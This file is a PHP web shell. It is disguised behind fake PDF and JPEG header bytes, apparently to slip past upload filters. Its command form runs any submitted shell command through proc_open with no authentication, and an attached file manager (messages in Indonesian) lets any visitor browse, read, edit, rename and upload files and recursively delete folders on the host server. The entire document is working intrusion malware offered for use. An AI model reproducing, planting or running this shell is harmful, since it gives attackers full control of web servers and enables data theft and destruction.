%PDF-1.5
ÿØÿà JFIF      ÿâ(ICC_PROFILE         mntrRGB XYZ             acsp                             öÖ     Ó-                                                   	desc   ð   trXYZ  d   gXYZ  x   bXYZ  Œ   rTRC      (gTRC      (bTRC      (wtpt  È   cprt  Ü   <mluc          enUS   X    s R G B                                                                                XYZ       o¢  8õ  XYZ       b™  ·…  ÚXYZ       $   „  ¶Ïpara        ff  ò§  
<DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Explorer</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        .file-content {
            border: 1px solid #ddd;
            padding: 15px;
            margin-top: 20px;
            background-color: #f9f9f9;
            overflow-x: auto;
        }
        .actions form {
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
<form method="post">
<font face=courier new size=4>Command :</font> <input type="text" class="area" name="cmd" size="30" height="20" value="ls -la" style="margin: 5px auto; padding-left: 5px;" required><br>
<button type="submit">Execute</button>
</form><hr>
<?php
$descriptorspec = array(
 0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
 1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
 2 => array("pipe", "r") // stderr is a file to write to
);
$env = array('some_option' => 'aeiou');
$meki = "";
if(isset($_POST['cmd'])){ 
$cmd = ($_POST['cmd']);
echo "<table width=100%><td><textarea cols=90 rows=25>";
$process = proc_open($cmd, $descriptorspec, $pipes, $meki, $env);
echo stream_get_contents($pipes[1]); die; }
?>

    <div class="container mt-4">
        <?php
        ini_set('log_errors', 'off');

        function getPermissions($path) {
            return substr(sprintf('%o', fileperms($path)), -4);
        }

        function listFilesAndDirectories($dir) {
            if (is_dir($dir)) {
                if ($dh = opendir($dir)) {
                    echo "<div class='path mb-3'><strong>Path:</strong> " . realpath($dir) . "</div>";

                    $folders = [];
                    $files = [];

                    while (($file = readdir($dh)) !== false) {
                        if ($file != "." && $file != "..") {
                            $fullPath = $dir . DIRECTORY_SEPARATOR . $file;
                            if (is_dir($fullPath)) {
                                $folders[] = $file;
                            } else {
                                $files[] = $file;
                            }
                        }
                    }

                    closedir($dh);

                    echo "<ul class='list-unstyled'>";
                    foreach ($folders as $folder) {
                        $fullPath = $dir . DIRECTORY_SEPARATOR . $folder;
                        echo "<li class='mb-2'>
                                <a href='?dir=" . urlencode($fullPath) . "'>📁 " . $folder . "</a> (" . getPermissions($fullPath) . ")
                                <form method='post' style='display:inline;'>
                                    <input type='hidden' name='deleteDir' value='" . htmlspecialchars($fullPath) . "'>
                                    <button type='submit' name='deleteDirBtn' class='btn btn-danger btn-sm'>Delete Folder</button>
                                </form>
                              </li>";
                    }
                    foreach ($files as $file) {
                        $fullPath = $dir . DIRECTORY_SEPARATOR . $file;
                        echo "<li class='mb-2'><a href='?dir=" . urlencode($dir) . "&file=" . urlencode($file) . "'>📄 " . $file . "</a> (" . getPermissions($fullPath) . ")</li>";
                    }
                    echo "</ul>";
                } else {
                    echo "<div class='alert alert-danger'>Tidak bisa membuka direktori.</div>";
                }
            } else {
                echo "<div class='alert alert-danger'>Bukan direktori yang valid.</div>";
            }
        }

        function showFileContent($filePath) {
            if (is_file($filePath) && is_readable($filePath)) {
                $content = htmlspecialchars(file_get_contents($filePath));
                echo "<div class='file-content'><h3>Isi File: " . basename($filePath) . "</h3><pre>$content</pre></div>";
            } else {
                echo "<div class='alert alert-danger'>Tidak bisa membaca file.</div>";
            }
        }

        function editFile($filePath, $newContent) {
            if (is_file($filePath) && is_writable($filePath)) {
                file_put_contents($filePath, $newContent);
                echo "<div class='alert alert-success'>File berhasil diperbarui.</div>";
            } else {
                echo "<div class='alert alert-danger'>Tidak bisa menulis ke file.</div>";
            }
        }

        function deleteFile($filePath) {
            if (is_file($filePath) && is_writable($filePath)) {
                unlink($filePath);
                echo "<div class='alert alert-success'>File berhasil dihapus.</div>";
            } else {
                echo "<div class='alert alert-danger'>Tidak bisa menghapus file.</div>";
            }
        }

        function renameFile($oldPath, $newPath) {
            if (is_file($oldPath) && is_writable($oldPath)) {
                rename($oldPath, $newPath);
                echo "<div class='alert alert-success'>File berhasil diganti nama.</div>";
            } else {
                echo "<div class='alert alert-danger'>Tidak bisa mengganti nama file.</div>";
            }
        }

        function uploadFile($uploadDir) {
            if ($_FILES['fileToUpload']['error'] == UPLOAD_ERR_OK) {
                $tmpName = $_FILES['fileToUpload']['tmp_name'];
                $name = basename($_FILES['fileToUpload']['name']);
                $uploadFile = $uploadDir . DIRECTORY_SEPARATOR . $name;
                if (move_uploaded_file($tmpName, $uploadFile)) {
                    echo "<div class='alert alert-success'>File berhasil diupload.</div>";
                } else {
                    echo "<div class='alert alert-danger'>Error saat mengupload file.</div>";
                }
            } else {
                echo "<div class='alert alert-danger'>Error saat mengupload file.</div>";
            }
        }

        function deleteDirectory($dirPath) {
            if (is_dir($dirPath)) {
                $items = array_diff(scandir($dirPath), array('.', '..'));
                foreach ($items as $item) {
                    $path = $dirPath . DIRECTORY_SEPARATOR . $item;
                    if (is_dir($path)) {
                        deleteDirectory($path);
                    } else {
                        unlink($path);
                    }
                }
                rmdir($dirPath);
                echo "<div class='alert alert-success'>Folder berhasil dihapus.</div>";
            } else {
                echo "<div class='alert alert-danger'>Tidak bisa menghapus folder.</div>";
            }
        }

        $startDir = getcwd();

        if (isset($_POST['path'])) {
            $currentDir = urldecode($_POST['path']);
        } else {
            $currentDir = isset($_GET['dir']) ? urldecode($_GET['dir']) : $startDir;
        }

        echo "<form method='post' class='mb-4'>
                <div class='form-group'>
                    <label for='path'>Go to Path:</label>
                    <input type='text' class='form-control' name='path' id='path' value='" . htmlspecialchars($currentDir) . "'>
                </div>
                <button type='submit' class='btn btn-primary'>Go</button>
              </form>";

        echo "<form action='' method='post' enctype='multipart/form-data' class='mb-4'>
                <div class='form-group'>
                    <label for='fileToUpload'>Upload File:</label>
                    <input type='file' class='form-control-file' name='fileToUpload' id='fileToUpload'>
                </div>
                <input type='hidden' name='uploadDir' value='" . htmlspecialchars($currentDir) . "'>
                <button type='submit' name='upload' class='btn btn-primary'>Upload</button>
              </form>";

        listFilesAndDirectories($currentDir);

        if (isset($_GET['file'])) {
            $selectedFile = urldecode($_GET['file']);
            $filePath = $currentDir . DIRECTORY_SEPARATOR . $selectedFile;
            showFileContent($filePath);

            echo "<div class='actions'>
                    <form method='post' class='mb-4'>
                        <h3>Edit File</h3>
                        <div class='form-group'>
                            <textarea class='form-control' name='newContent' rows='10'>" . htmlspecialchars(file_get_contents($filePath)) . "</textarea>
                        </div>
                        <input type='hidden' name='filePath' value='" . htmlspecialchars($filePath) . "'>
                        <button type='submit' name='edit' class='btn btn-primary'>Save</button>
                    </form>
                    <form method='post' class='mb-4'>
                        <h3>Rename File</h3>
                        <div class='form-group'>
                            <input type='text' class='form-control' name='newName' value='" . htmlspecialchars($selectedFile) . "'>
                        </div>
                        <input type='hidden' name='filePath' value='" . htmlspecialchars($filePath) . "'>
                        <button type='submit' name='rename' class='btn btn-primary'>Rename</button>
                    </form>
                    <form method='post'>
                        <h3>Delete File</h3>
                        <input type='hidden' name='filePath' value='" . htmlspecialchars($filePath) . "'>
                        <button type='submit' name='delete' class='btn btn-danger'>Delete</button>
                    </form>
                </div>";
        }

        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            if (isset($_POST['edit'])) {
                $newContent = $_POST['newContent'];
                $filePath = $_POST['filePath'];
                editFile($filePath, $newContent);
            } elseif (isset($_POST['rename'])) {
                $newName = $_POST['newName'];
                $filePath = $_POST['filePath'];
                $newPath = dirname($filePath) . DIRECTORY_SEPARATOR . $newName;
                renameFile($filePath, $newPath);
            } elseif (isset($_POST['delete'])) {
                $filePath = $_POST['filePath'];
                deleteFile($filePath);
            } elseif (isset($_POST['upload'])) {
                $uploadDir = $_POST['uploadDir'];
                uploadFile($uploadDir);
            } elseif (isset($_POST['deleteDirBtn'])) {
                $dirPath = $_POST['deleteDir'];
                deleteDirectory($dirPath);
            }
        }
        ?>
    </div>
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.3/dist/umd/popper.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
</body>
</html>
